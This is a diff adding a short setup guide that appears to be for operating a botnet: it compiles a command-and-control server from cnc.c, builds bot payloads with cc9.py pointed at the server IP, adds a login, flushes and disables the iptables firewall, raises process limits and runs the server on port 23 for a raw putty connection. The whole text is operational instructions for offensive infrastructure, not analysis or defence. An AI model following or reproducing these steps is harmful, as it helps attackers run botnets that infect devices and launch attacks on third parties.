@@ -1,0 +1,23 @@
+# edit bot.c   >>>  VPS Server IP     <<<< IMPORTANT >>>>
+# drag the files through to your vps
+
+=================================================================================
+
+chmod 777 *
+yum install python-paramiko nano screen gcc bzip2 perl wget lbzip unzip httpz iptables-services-y
+
+gcc cnc.c -o server -pthread
+python cc9.py bot.c (INSERT SERVER IP HERE & REMOVE BRACKETS) 
+
+# COPY PAYLOAD TO TXT FILE 
+     
+     user pass
+echo Guns Guns1212 >> login.txt
+
+service iptables stop; service httpd restart
+iptables -F; systemctl disable --now iptables
+ulimit -n999999; ulimit -u999999; ulimit -e999999;
+
+screen ./server 23 1 666
+# CTRL A + D
+# Connect on putty with raw connection
